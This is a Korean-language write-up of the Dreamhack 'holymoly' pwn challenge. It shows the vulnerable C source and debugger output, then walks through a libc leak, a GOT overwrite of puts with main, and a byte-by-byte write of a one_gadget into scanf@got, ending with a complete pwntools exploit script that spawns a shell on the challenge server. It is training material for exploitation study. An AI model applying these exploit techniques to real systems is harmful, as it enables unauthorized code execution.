---
title: "[Dreamhack] holymoly"
date: 2026-04-10
categories: [CTF/Wargame]
tags: [Wargame]
description: "lv5-holymoly"
---
```assembly
pwndbg> checksec
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
```

```c
/* holymoly.c
 * gcc -Wall -no-pie -s holymoly.c -o holymoly
*/

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define HOLYMOLY_ID         0
#define ROLYPOLY_ID         1
#define MONOPOLY_ID         2
#define GUACAMOLE_ID        3
#define ROBOCARPOLI_ID      4
#define HALLIGALLI_ID       5
#define BROCCOLI_ID         6
#define BORDERCOLLIE_ID     7
#define BLUEBERRY_ID        8
#define CRANBERRY_ID        9
#define MYSTERY_ID          10
#define INVALID_ID          11

#define HOLYMOLY        "holymoly"
#define ROLYPOLY        "rolypoly"
#define MONOPOLY        "monopoly"
#define GUACAMOLE       "guacamole"
#define ROBOCARPOLI     "robocarpoli"
#define HALLIGALLI      "halligalli"
#define BROCCOLI        "broccoli"
#define BORDERCOLLIE    "bordercollie"
#define BLUEBERRY       "blueberry"
#define CRANBERRY       "cranberry"
#define MYSTERY         "mystery"

#define SWITCH_VAL      0
#define SWITCH_PTR      1

struct phrase_t {
    uint8_t id;
    char *str;
    size_t len;
};

const struct phrase_t phrases[11] = {
    {.id = HOLYMOLY_ID,      .str = HOLYMOLY,     .len = sizeof(HOLYMOLY)},
    {.id = ROLYPOLY_ID,      .str = ROLYPOLY,     .len = sizeof(ROLYPOLY)},
    {.id = MONOPOLY_ID,      .str = MONOPOLY,     .len = sizeof(MONOPOLY)},
    {.id = GUACAMOLE_ID,     .str = GUACAMOLE,    .len = sizeof(GUACAMOLE)},
    {.id = ROBOCARPOLI_ID,   .str = ROBOCARPOLI,  .len = sizeof(ROBOCARPOLI)},
    {.id = HALLIGALLI_ID,    .str = HALLIGALLI,   .len = sizeof(HALLIGALLI)},
    {.id = BROCCOLI_ID,      .str = BROCCOLI,     .len = sizeof(BROCCOLI)},
    {.id = BORDERCOLLIE_ID,  .str = BORDERCOLLIE, .len = sizeof(BORDERCOLLIE)},
    {.id = BLUEBERRY_ID,     .str = BLUEBERRY,    .len = sizeof(BLUEBERRY)},
    {.id = CRANBERRY_ID,     .str = CRANBERRY,    .len = sizeof(CRANBERRY)},
    {.id = MYSTERY_ID,       .str = MYSTERY,      .len = sizeof(MYSTERY)},
};

int amounts[4] = {0x1000, 0x100, 0x10, 0x1};

uint64_t *ptr;
uint64_t val;
uint8_t ptrval_switch;

void Init();
void Interpret(char *song);
uint8_t Parse(char *song_ptr);
void ProcessPhraseID(uint8_t id);
void Increase(int amount);
void Decrease(int amount);
void Read();
void Write();
void OperateSwitch();

int main(void) {
    char *song;

    Init();
    printf("holymoly? ");
    song = calloc(0xbeef, 1);
    scanf("%48878s", song);
    Interpret(song);
    puts("holymoly!");
}

void Init() {
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stderr, 0, _IONBF, 0);
    ptr = NULL;
    val = 0;
}

void Interpret(char *song) {
    uint8_t id;
    char *song_ptr;

    song_ptr = song;

    while (1) {
        id = Parse(song_ptr);
        if (id >= INVALID_ID)
            return;
        ProcessPhraseID(id);
        song_ptr += phrases[id].len - 1;
    }
}

uint8_t Parse(char *song_ptr) {
    int i;

    for (i = 0; i < sizeof(phrases) / sizeof(phrases[0]); i++)
        if (memcmp(phrases[i].str, song_ptr, phrases[i].len - 1) == 0)
            return phrases[i].id;

    return INVALID_ID;
}

void ProcessPhraseID(uint8_t id) {
    switch (id) {
    case HOLYMOLY_ID ... GUACAMOLE_ID:
        Increase(amounts[id - HOLYMOLY_ID]);
        break;
    case ROBOCARPOLI_ID ... BORDERCOLLIE_ID:
        Decrease(amounts[id - ROBOCARPOLI_ID]);
        break;
    case BLUEBERRY_ID:
        Read();
        break;
    case CRANBERRY_ID:
        Write();
        break;
    case MYSTERY_ID:
        OperateSwitch();
        break;
    }
}

void Increase(int amount) {
    if (ptrval_switch)
        ptr = (uint64_t *)((uint8_t *)ptr + amount);
    else
        val += amount;
}

void Decrease(int amount) {
    if (ptrval_switch)
        ptr = (uint64_t *)((uint8_t *)ptr - amount);
    else
        val -= amount;
}

void Read() {
    write(1, (char *)ptr, 8);
}

void Write() {
    *ptr = val;
}

void OperateSwitch() {
    ptrval_switch = ptrval_switch ? SWITCH_VAL : SWITCH_PTR;
}

```

- ptr: uint64_t * 타입. 초기값 NULL. 메모리 주소를 가리킵니다.

- val: uint64_t 타입. 초기값 0. ptr에 쓸 데이터를 저장합니다.

- ptrval_switch: 0이면 val을 조작하고, 1이면 ptr을 조작합니다.

- phrases: 명령어 문자열과 ID가 매핑된 구조체 배열입니다.

### 1. libc leak

1. 프로그램 시작 시 ptr은 0

1. MYSTERY를 호출하여 모드를 SWITCH_PTR(1)로 변경

1.  ptr을 setvbuf@got  주소로 이동 (NO_PIE)

1. BLUEBERRY를 호출 → libc leak

```assembly
pwndbg> got
Filtering out read-only entries (display them with -r or --show-readonly)

State of the GOT of /mnt/c/users/kyseo/Desktop/holymoly/holymoly:
GOT protection: Partial RELRO | Found 7 GOT entries passing the filter
[0x404018] puts@GLIBC_2.2.5 -> 0x401030 ◂— endbr64
[0x404020] write@GLIBC_2.2.5 -> 0x401040 ◂— endbr64
[0x404028] printf@GLIBC_2.2.5 -> 0x7ffff7c606f0 (printf) ◂— endbr64
[0x404030] memcmp@GLIBC_2.2.5 -> 0x401060 ◂— endbr64
[0x404038] calloc@GLIBC_2.2.5 -> 0x7ffff7ca6520 (calloc) ◂— endbr64
[0x404040] setvbuf@GLIBC_2.2.5 -> 0x7ffff7c815f0 (setvbuf) ◂— endbr64
[0x404048] __isoc99_scanf@GLIBC_2.7 -> 0x7ffff7c62090 (__isoc99_scanf) ◂— endbr64
```


 출력한다고 하더라도 프로그램이 종료되기 때문에 이를 해결해야함.

Partial RELRO 이므로 got overwrite 이용

 puts("holymoly!");  → puts@got에 main함수 주소 적기 

- ptr -> puts@got 이동

- val -> main 주소 생성

- CRANBERRY (puts@got = main)

이후 libc leak 진행 

```assembly
 0x401138    call   qword ptr [rip + 0x2e9a]    <__libc_start_main>
        rdi: 0x4011f6 ◂— endbr64
        rsi: 1
        rdx: 0x7fffffffdd18 —▸ 0x7fffffffe03c ◂— '/mnt/c/users/kyseo/Desktop/holymoly/holymoly'
        rcx: 0x4015a0 ◂— endbr64
        r8: 0x401610 ◂— endbr64
        r9: 0x7ffff7fc9040 (_dl_fini) ◂— endbr64
        arg[6]: 0x7fffffffdd08 ◂— 0x1c
```

0x4011f6 : main함수 주소

0x404018 에 0x4011f6  쓰기

방법 1. printf@got에 원가젯을 붙여넣어 실행

print@got : 0x404028

```assembly
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
```

0xe3afe 0xe3b01 0xe3b04

onegadget은 libc 안에 있는데, 이를 amouts 내부에 있는 배열로만 만들 경우

scanf("%48878s", song);  으로 다 만들 수 없다. 

0000000404060 dword_404060    dd 1000h, 100h, 10h, 1  ; DATA XREF: sub_4013FB+4F↑o

- ptr을 amounts 배열(0x404060)로 옮긴다

- CRANBERRY(ptr = val)를 쓰면 현재 val 값이 amounts[0]에 들어간다

- HOLYMOLY(val += amounts[0])를 실행하면 val += val이 되어 값이 2배(Double)가 된다.

![[Dreamhack] holymoly](/assets/img/posts/holymoly/2026-04-10-holymoly-1.png)

amounts 배열이 int (4바이트) 로 선언 

amounts[0] = val을 할 때, 64비트인 val이 4바이트로 잘려서 저장

64비트 주소(Libc 영역)를 만들 수 없다.

1바이트씩 옆으로 이동하며 쓰기

- example: setvbuf@got에 0x04, 0x3b, 0x4e, 0x8a ... 순서로 넣기.

- 원리:

—> 4bytes씩 쪼개서 넣으면 될거 같다

원자젯 조건 / 로되리안/ 뭐 이것저것 이슈가 많이 터져서 삽질좀 하다가 

0xe3b01 원가젯을 0x404048 (scanf@got)에 넣었더니 쉘이 따졌다. 

아래는 최종 페이로드 

```python
from pwn import *

#p = process('./holymoly')
p = remote('host3.dreamhack.games', 20198) 

def make_amount(target_value):
    payload = b""
    count = target_value // 0x1000
    payload += b"holymoly" * count
    rem = target_value % 0x1000
    count = rem // 0x100
    payload += b"rolypoly" * count
    rem = rem % 0x100
    count = rem // 0x10
    payload += b"monopoly" * count
    rem = rem % 0x10
    payload += b"guacamole" * rem
    return payload

def make_decrease(target_value):
    payload = b""
    count = target_value // 0x1000
    payload += b"robocarpoli" * count
    rem = target_value % 0x1000
    count = rem // 0x100
    payload += b"halligalli" * count
    rem = rem % 0x100
    count = rem // 0x10
    payload += b"broccoli" * count
    rem = rem % 0x10
    payload += b"bordercollie" * rem
    return payload

#puts@got, 0x404018, ptr
payload = b'mystery'
payload += make_amount(0x404018)

#main_addr, 0x4011f6, val
payload += b"mystery"
payload += make_amount(0x4011f6)
payload += b"cranberry"
p.sendlineafter(b"holymoly? ", payload)

#--ret2main--

#setvbuf@got, 0x404040, ptr
payload = b'mystery'
payload += make_amount(0x404040)
payload += b"blueberry"
p.sendlineafter(b"holymoly? ", payload)

libc_leak = u64(p.recvn(8))
#libc_base = libc_leak - 0x815f0
libc_base = libc_leak - 0x84ce0
print(hex(libc_base))


onegadget = libc_base + 0xe3b01
payload = make_amount(0x404048)

target_bytes = p64(onegadget)
current_val = 0

for i in range(6):
    target = target_bytes[i]
    
    if i > 0:
        payload += b"mystery" 
        payload += b"guacamole" # ptr += 1
        payload += b"mystery"
    else:
        payload += b"mystery"

    if target > current_val:
        payload += make_amount(target - current_val)
    elif target < current_val:
        payload += make_decrease(current_val - target)
    
    current_val = target
    payload += b"cranberry"

#gdb.attach(p, '''
#    b *0x401243
#    c
#    ''')
p.sendlineafter(b"holymoly? ", payload)
p.sendlineafter(b"holymoly? ", b'1')
p.interactive()
```

쉘 획득
